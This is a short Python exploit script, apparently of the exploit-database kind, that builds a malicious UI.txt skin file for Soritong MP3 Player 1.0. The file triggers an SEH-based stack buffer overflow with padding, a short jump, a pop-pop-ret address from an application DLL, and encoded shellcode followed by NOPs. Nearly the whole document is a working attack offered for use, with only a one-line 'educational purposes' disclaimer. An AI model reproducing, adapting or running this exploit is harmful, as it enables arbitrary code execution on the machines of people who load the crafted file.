#Soritong MP3 Player 1.0 Universal BOF !
#Greetz to Peter Van Eeckhoutte and Corelanc0d3r team ;-)
#Discovered by : (Stack )
#Written by : (Jacky )
#I searched for a Python Edition for this Vulnerability but i haven't found any Python written exploit
#So i decided to give it a chance and try to write it with Python and it has successfully Done!!!
#This exploit is for EDUCATIONAL PURPOSES ONLY !!!
crashfile="UI.txt"
print "Soritong MP3 Player v1.0 Universal BOF by Jacky \n"
print "Greetz to Peter Van Eeckhoutte and Corelanc0d3r team\n"
junk="A"*584
nseh="\xeb\x06\x90\x90"         #Short jump over 6 bytes forward.
seh="\x12\xe8\x01\x10"           #PPR from a .dll application file.
sc=("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
"\x7f\xe8\x7b\xca")           #Here is the Pain!!!
junk2="\x90"*1000               #Additional nops!
file=open(crashfile,'w')
file.write(junk+nseh+seh+sc+junk2)
print "[+]File has been created successfully!\n"
print "[+]Written By Jacky\n"
file.close()